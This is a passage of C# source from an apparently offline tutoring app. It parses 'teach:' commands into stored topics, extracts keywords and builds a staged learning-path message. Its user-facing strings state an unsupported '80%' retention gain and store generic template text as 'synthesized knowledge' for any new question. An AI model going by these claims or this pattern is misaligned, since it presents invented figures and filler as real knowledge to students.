            else if (payload.StartsWith("teach:", StringComparison.OrdinalIgnoreCase)) payload = payload.Substring(6).Trim();

            var parts = payload.Split('|', StringSplitOptions.TrimEntries);
            string topic = parts.Length > 0 ? parts[0] : "Student Concept";
            string domain = parts.Length > 1 ? parts[1] : "General";
            string details = parts.Length > 2 ? parts[2] : (parts.Length > 0 ? parts[0] : "Learned student discovery");
            string code = parts.Length > 3 ? parts[3] : "// Custom student code example\nvoid StudentLesson() { }";

            var kw = Regex.Matches(topic.ToLowerInvariant() + " " + details.ToLowerInvariant(), @"\w+")
                .Select(m => m.Value)
                .Where(w => w.Length > 2)
                .Distinct()
                .Take(8)
                .ToList();

            TeachLocalAi(topic, domain, "Learned", kw, details, code, new List<string> { $"Practice {topic}", $"Test in Polyglot Sandbox" }, conn, "Interactive Student");

            int newCount = GetTotalLearnedCount();
            return new LocalAiResponse(
                $"Learned: {topic}",
                domain,
                "Self-Assimilated",
                $"🎓 Knowledge Successfully Assimilated!\n\nI have permanently learned '{topic}' and integrated it into my offline in-memory knowledge base.\n\n" +
                $"• Domain: {domain}\n" +
                $"• Indexed Keywords: {string.Join(", ", kw)}\n" +
                $"• Persistent Storage: Saved to encrypted local database\n" +
                $"• Total Self-Learned Topics: {newCount}\n\n" +
                "I will now draw upon this knowledge when answering future questions from you or other students!",
                code,
                new() { $"Ask me about {topic}", "Explore the Polyglot IDE", "Check Zero-to-Hero Roadmap" },
                1.0,
                new() { "Parsed direct instruction payload", "Extracted semantic keywords and code blocks", "Stored in-memory and synced to SQLite", "Knowledge bank updated successfully" },
                "Autonomous Self-Learned Knowledge",
                true,
                "🌟 Excellent teaching! Expanding your mentor's knowledge improves retention by 80% through the Protégé Effect.",
                newCount
            );
        }

        private static void AutoSelfImproveKnowledge(string prompt, KnowledgeEntry entry, SqliteConnection? conn)
        {
            try
            {
                var newTokens = Regex.Matches(prompt.ToLowerInvariant(), @"\w+")
                    .Select(m => m.Value)
                    .Where(w => w.Length > 3 && !entry.Keywords.Contains(w))
                    .Take(2)
                    .ToList();

                if (newTokens.Count > 0)
                {
                    lock (KnowledgeLock)
                    {
                        entry.Keywords.AddRange(newTokens);
                    }
                }
            }
            catch { }
        }

        private static void AssimilateNovelInquiry(string prompt, string domain, SqliteConnection? conn)
        {
            try
            {
                var kw = Regex.Matches(prompt.ToLowerInvariant(), @"\w+")
                    .Select(m => m.Value)
                    .Where(w => w.Length > 2)
                    .Distinct()
                    .Take(6)
                    .ToList();

                if (kw.Count >= 2)
                {
                    string topic = string.Join(" ", kw.Take(3).Select(w => char.ToUpper(w[0]) + w.Substring(1)));
                    string explanation = "Synthesized knowledge for " + prompt + ". This topic connects fundamental architecture, security considerations, and practical execution.";
                    string code = "// Autonomous Study Template for " + topic + "\nvoid MasterTopic() {\n    // Explore practical labs in Bhavani Academy\n}";
                    TeachLocalAi(topic, domain, "Intermediate", kw, explanation, code, new() { "Learn " + topic, "Run in Sandbox" }, conn, "Autonomous Inquiry");
                }
            }
            catch { }
        }

        private static string GenerateStudentGuidance(string domain, string masteryLevel, int completedLessons)
        {
            string milestone = completedLessons switch
            {
                0 => "🌱 Stage 1: Computer Fundamentals (CS101) & Binary Logic",
                < 6 => "🌿 Stage 2: Polyglot Programming (PROG101) & Algorithmic Loops",
                < 18 => "🌲 Stage 3: Hardware PC Architecture (HW101) & RISC Pipeline",
                < 36 => "🚀 Stage 4: CCNA Networking (NET101) & Packet Tracer",
                < 54 => "🛡️ Stage 5: Grey Hat Cybersecurity (SEC101) & Safe CTF",
                _ => "👑 Stage 6: Frontier AI (AI101) & Technology Master Capstones"
            };

            return $"🎯 Personalized Learning Pathway:\n" +
                   $"• Current Progress Tier: {milestone}\n" +
                   $"• Recommended Next Focus: {domain} ({masteryLevel})\n" +
                   $"• Pedagogical Strategy: After reviewing this explanation, open the relevant Workbench tab to build and run the code hands-on!";
        }

        public static List<KnowledgeEntry> GetAllTopics()
        {
            lock (KnowledgeLock)
            {
                var all = new List<KnowledgeEntry>(KnowledgeBase);
                all.AddRange(LearnedKnowledgeBase);
                return all;
            }
        }

        public static CodeReviewResult ReviewCodeSnippet(string code, string language = "csharp")
        {
            return CodeReviewerService.ReviewCode(code, language);
        }
    }
}
